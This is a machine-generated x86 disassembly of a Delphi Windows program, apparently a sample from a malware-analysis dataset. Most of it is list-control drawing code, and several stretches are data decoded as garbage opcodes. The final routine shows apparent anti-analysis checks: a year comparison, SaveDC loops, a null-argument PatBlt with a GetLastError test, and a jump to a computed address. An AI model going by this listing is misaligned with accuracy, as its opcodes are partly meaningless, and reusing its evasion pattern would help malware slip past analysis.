add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0xc0047 ] ch
push esi
test dl dl
je r-xdata
push sub_474248
mov eax [ ebp - 0x4 ]
call sub_403190
retn
jb r-xdata
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
add [ eax + 0x18004031 ] al
inc esp
outsd
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445248
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
outsb
push ebx
je r-xdata
call sub_4285d8
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4741c8
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_474241
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4296c0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474248
mov eax [ ebp - 0x4 ]
call sub_403190
retn
add eax 0x3
sub_474270
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445248
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4742c0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_445334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4742f0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax ebx
call sub_445e00
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax ebx
call sub_474410
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebx + 0x290 ]
call sub_40d1d0
inc eax
mov [ esp ] eax
xor esi esi
mov edx esi
mov eax ebx
call sub_474b94
mov edi eax
mov edx esi
mov eax [ ebx + 0x290 ]
call sub_418470
mov ebp eax
mov eax ebp
call sub_474260
mov [ edi + 0x8 ] al
mov eax ebp
call sub_474264
mov [ edi + 0x9 ] al
inc esi
dec [ esp ]
jne r-xdata
sub_474364
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_445ed0
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x290 ] eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_474980
xor al 0x1
push eax
mov edx esi
mov eax ebx
call sub_4749ac
pop edx
call sub_47424c
mov edx eax
mov eax [ ebx + 0x290 ]
call sub_418314
inc esi
dec edi
jne r-xdata
sub_474410
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x228 ]
call sub_42492c
mov edx r-xdata
mov eax [ ebx + 0x228 ]
call sub_424888
mov esi eax
mov [ ebx + 0x284 ] esi
push esi
xor ecx ecx
mov edx 0x1a0
mov eax ebx
call sub_44e340
sub_474463
inc [ edx ]
add [ eax ] al
add [ edi + 0x67 ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4743f0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
push edi
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_446288
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x252 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_474980
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x254 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov [ eax + 0x254 ] edx
xor eax eax
push ebp
push j_sub_403924#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_446288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_474d54
test al al
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x294 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
call sub_423a40
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x298 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x14 ]
call sub_42420c
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff000011
call sub_423a40
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
test bl bl
jne r-xdata
push ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4749ac
mov ecx eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_474670
jmp r-xdata
sub_474614
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_474d54
test al al
jne r-xdata
mov edx ebp
mov eax ebx
call sub_4463c4
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
mov eax ebx
call sub_4743f0
sub [ edi + 0x24 ] eax
mov eax ebx
call sub_4743f0
add [ edi + 0x1c ] eax
jmp r-xdata
sub_474670
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] cl
mov esi eax
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
add edx eax
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
adc edx 0x0
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
add eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
add eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov ebx [ esi + 0x228 ]
cmp [ esi + 0x281 ] 0x0
je r-xdata
adc edx 0x0
call sub_43c850
call sub_43c930
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push edi
mov eax ebx
call sub_424a0c
push eax
call GetClipRgn
mov eax [ ebp - 0x24 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x28 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x2c ]
add eax 0x2
push eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
call CreateRectRgn
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_424a0c
push eax
call SelectClipRgn
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x408
mov [ ebp - 0x8 ] 0x400
jmp r-xdata
call sub_43c850
lea ecx [ ebp - 0x3c ]
mov dl 0x12
call sub_43cb94
jmp r-xdata
call sub_43c850
lea ecx [ ebp - 0x3c ]
mov dl 0xf
call sub_43cb94
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_424a0c
push eax
call DrawFrameControl
or [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax ebx
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x3c ]
pop edx
call sub_43ca3c
jmp r-xdata
call sub_43c850
lea ecx [ ebp - 0x3c ]
mov dl 0x1a
call sub_43cb94
call sub_43c850
lea ecx [ ebp - 0x3c ]
mov dl 0x17
call sub_43cb94
jmp r-xdata
call sub_43c850
lea ecx [ ebp - 0x3c ]
mov dl 0x16
call sub_43cb94
jmp r-xdata
call sub_43c850
lea ecx [ ebp - 0x3c ]
mov dl 0x13
call sub_43cb94
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
mov eax ebx
call sub_424a0c
push eax
call SelectClipRgn
push edi
call DeleteObject
mov eax [ ebx + 0x14 ]
call sub_424320
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x14 ]
call sub_424204
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_423f24
mov edi eax
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_424328
mov edx 0xff000010
mov eax [ ebx + 0x10 ]
call sub_423f2c
mov eax [ ebp - 0x28 ]
dec eax
push eax
mov eax [ ebp - 0x24 ]
dec eax
push eax
mov ecx [ ebp - 0x2c ]
inc ecx
mov edx [ ebp - 0x30 ]
inc edx
mov eax ebx
call sub_4246ec
mov dl [ ebp - 0x9 ]
mov eax [ ebx + 0x14 ]
call sub_424328
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_42420c
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_423f2c
cmp [ esi + 0x281 ] 0x0
je r-xdata
sub_4748cc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4749ac
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
call sub_474b94
mov [ eax + 0x8 ] bl
mov edx esi
mov eax edi
call sub_4748fc
sub_4748fc
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474d54
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebx
call sub_445c84
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
mov eax ebx
call sub_4743f0
mov edx [ esp + 0x8 ]
sub edx eax
mov [ esp ] edx
mov eax ebx
call sub_4743f0
add eax [ esp ]
mov [ esp + 0x8 ] eax
jmp r-xdata
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_453a88
push eax
call InvalidateRect
mov eax ebx
call sub_453a88
push eax
call UpdateWindow
sub_474980
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474c48
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_474b94
mov al [ eax + 0x9 ]
xor al 0x1
pop esi
pop ebx
retn
sub_4749ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474c48
test al al
je r-xdata
mov eax [ r-xdata ]
call sub_47426c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_474b94
mov al [ eax + 0x8 ]
pop esi
pop ebx
retn
sub_4749dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x20
jne r-xdata
mov edx esi
mov eax ebx
call sub_4465f8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_474adc
sub_474a08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push esi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44e754
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax edi
call sub_416e0c
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax ebx
call sub_445bf8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_474980
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_445c84
mov esi [ ebp - 0x18 ]
mov eax ebx
call sub_4743f0
sub esi eax
sub edi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_445c84
sub edi [ ebp - 0x20 ]
mov eax ebx
call sub_4743f0
cmp edi eax
jge r-xdata
mov eax ebx
call sub_4743f0
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_474adc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_474adc
sub_474adc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_474980
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4749ac
mov edx eax
sub dl 0x1
jb r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
je r-xdata
mov al 0x1
jmp r-xdata
mov al 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
dec dl
je r-xdata
mov ecx eax
mov edx esi
mov eax ebx
call sub_4748cc
mov eax ebx
mov si 0xffad
call sub_40338c
mov al 0x1
jmp r-xdata
sub_474b6c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
mov edx esi
mov eax ebx
call sub_474c48
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_474b94
mov edi [ eax + 0x4 ]
sub_474b94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474bb4
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_474c20
sub_474bb4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445400
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
xor ebx ebx
sub_474c20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_445420
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_474c60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474c48
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_474b94
mov [ eax + 0x4 ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_474c8c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_44547c
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_474b94
call sub_403190
mov edx ebx
mov eax edi
call sub_474c48
test al al
je r-xdata
sub_474cd0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474c48
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44545c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_474b94
call sub_403190
sub_474d14
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx ebp
mov eax edi
call sub_452cdc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_474bb4
call sub_403190
inc esi
dec ebx
jne r-xdata
sub_474d54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_474c48
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_474b94
mov al [ eax + 0xa ]
pop esi
pop ebx
retn
sub_474da4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474dc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474dd0
retn
sub_474de8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x50
inc edi
add [ edi + ecx * 2 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x50 ] dl
inc edi
add [ eax + 0x3 ] al
add [ eax ] al
fsubr [ esi ]
inc esi
add ah al
push cs
inc edx
add [ eax ] al
pop ebx
inc esi
add [ esp + ebx * 2 + 0x33ec0046 ] dh
inc eax
add [ eax ] ah
add [ esi ] sub_403128
inc esp
xor [ eax ] eax
sbb al 0x5d
inc esi
add [ eax - 0x73ffbabb ] ah
bound eax [ esi ]
test [ edx + 0x5edc0041 ] cl
inc esi
add [ eax ] bl
pop edi
inc esi
add [ eax ] ah
inc esi
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add [ eax + ebp * 2 + 0xbbc0046 ] bl
inc edx
add [ esp ] bh
inc esi
add [ ecx + ebx * 2 + 0x46 ] dh
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
jl r-xdata
add ah bl
add [ esi ] 0x24
push cs
inc ebp
add [ edx + edi - 0x782fffbb ] bl
inc esi
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add ah ah
pushfd
inc esi
add [ eax + 0x52 ] ch
inc esi
add [ eax ] bl
push ebp
inc esi
add ah al
lea eax [ esi ]
add [ esi + 0x46 ] bl
add [ esi + ebx * 2 + 0x46 ] bh
add ah al
mov al [ 0x5b380046 ]
inc esi
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] bl
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x70 ]
inc si
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax + ebp * 2 + 0x46 ] ah
add [ eax ] dh
inc esi
add [ eax ] ah
rol [ eax + eax - 0x24 ] cl
push 0xf4c80046
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ eax + ebx * 2 + 0x46 ] dh
add [ eax + 0x2800466f ] al
cmovne eax [ eax ]
inc esp
jl r-xdata
add [ ecx ] cl
push esp
jb r-xdata
je r-xdata
inc esi
add al cl
fwait
inc esi
add [ eax + 0x7c004682 ] ch
popfd
inc esi
add [ eax + 0x68 ] ah
inc esi
add [ edx ] dl
add [ eax + 0x50 ] bl
inc edi
add al bh
add al [ eax ]
add [ eax ] al
add [ edi ] al
inc edx
jne r-xdata
pop ebx
add [ edi + edi * 2 + 0x7e600046 ] ah
inc esi
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
push cs
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
add [ eax ] al
or [ eax ] al
or [ edx + esi * 2 + 0x61 ] edx
outsb
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
je r-xdata
xor al 0x3
add [ eax ] al
str [ ebx + edx * 2 ]
jo r-xdata
inc edx
sbb al 0x3
add [ eax ] al
or [ eax ] eax
pop es
dec eax
outsd
je r-xdata
add [ edi ] al
jo r-xdata
je r-xdata
push es
push esp
inc esi
outsd
jb sub_4750c4
add [ eax - 0x22 ] ch
inc edx
add [ esi + esi + 0x16b40047 ] al
inc ebx
add [ edi + ecx ] ch
inc edi
add [ eax - 0x14 ] ah
inc edx
je r-xdata
sub [ ebx ] al
add [ eax ] al
or al 0x0
push cs
dec eax
popad
add [ 0x63656843 ] cl
imul ecx [ ecx + ebp * 2 + 0x73 ] 0x74
inc edx
xor [ eax ] esi
add eax [ eax ]
add [ esi ] cl
jns r-xdata
add eax [ eax ]
outsb
jne r-xdata
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push sub_475135
push [ fs : eax ]
inc ebx
add [ eax ] al
inc esp
inc ebx
add ah ah
push edi
inc ebx
xor [ edx ] edx
add [ eax - 0x6 ] ch
inc ebx
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47513c
retn
push [ eax ]
xor [ eax ] esi
dec esi
inc edi
add [ eax ] ah
xor [ esi ] al
pop esi
add [ 0x74696e55 ] al
add [ ebx + 0x4750a8c0 ] cl
je r-xdata
add [ eax ] al
outsd
js r-xdata
popad
jae r-xdata
outsd
outsb
je r-xdata
jb r-xdata
and [ ebx ] al
add [ eax ] al
or al [ eax ]
cmove esp [ ecx + 0x74 ]
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
add [ edi ] al
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
popad
add [ ebx ] al
add [ eax ] al
add al [ eax ]
add eax 0x74696445
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or [ ebx + 0x6f ] eax
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
cmp [ ebp - 0x4 ] 0x8
jbe r-xdata
nop
nop
inc esi
pushad
in al dx
outsb
xor [ eax ] edi
add eax [ eax ]
add [ eax ] dl
add [ ecx ] cl
dec ebp
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
inc ebp
imul esi [ fs : ecx + esi + 0x3c ] 0x11000003
add [ ecx ] cl
push ebx
jo r-xdata
add [ ebx ] dl
inc edx
add [ esi + ecx * 4 ] bl
inc ebp
add [ eax - 0x27ffbd13 ] ch
pop edi
inc ebx
add ah ah
imul eax [ ebx ] r-xdata
add [ ebx + eax * 2 ] al
in al 0x57
inc ebx
outsd
insb
xor [ ebx + eax ] ebp
add [ eax ] al
or eax 0x65420600
jbe r-xdata
insb
and al 0x3
add [ eax ] al
or eax [ eax ]
or dl [ ebx + 0x74 ]
popad
je r-xdata
sbb [ ebx ] al
outsb
insb
xor [ eax ] edx
add eax [ eax ]
add [ esi ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31431
or al 0x3
add [ eax ] al
add eax 0x61500600
cmp ecx 0xc0
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax 0x0
je r-xdata
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
push ecx
mov [ ebp - 0x4 ] edx
cmp eax 0x1868
jbe r-xdata
and [ eax ] dh
inc esi
add [ esi ] bl
add eax 0x74696e55
outsb
inc ebp
imul esi [ fs : ecx + esi + 0x6 ] 0x726f4654
insd
enter 0x45 0x40
fild [ ebx ]
movsb [ edi ] [ esi ]
salc
inc ebx
add [ esi + ebp * 8 + 0x43 ] bl
adc al [ eax ]
push 0x43fa
jae r-xdata
nop
jmp eax
jne r-xdata
inc edx
popad
jb r-xdata
sub_4750c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] edx
cmp eax 0x1868
jbe r-xdata
cmp [ ebp - 0x4 ] 0x8
jbe r-xdata
nop
nop
cmp ecx 0xc0
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax 0x0
je r-xdata
nop
jmp eax
sub_4750f1
push eax
inc edi
add [ ecx ] dl
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push sub_475135
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47513c
retn
sub_475140
push ebp
mov ebp esp
push ebx
push esi
xor eax eax
push ebp
push j_sub_403924#2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475362
retn
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
mov ebx 0x202b
nop
jmp r-xdata
nop
nop
push 0x0
call SaveDC
nop
nop
nop
nop
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call PatBlt
call GetLastError
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
jmp r-xdata
push 0x0
call SaveDC
push 0x0
call SaveDC
mov ebx 0x8afa
nop
nop
push 0x0
call SaveDC
jmp r-xdata
push 0x0
call SaveDC
dec ebx
jne r-xdata
nop
nop
push 0x0
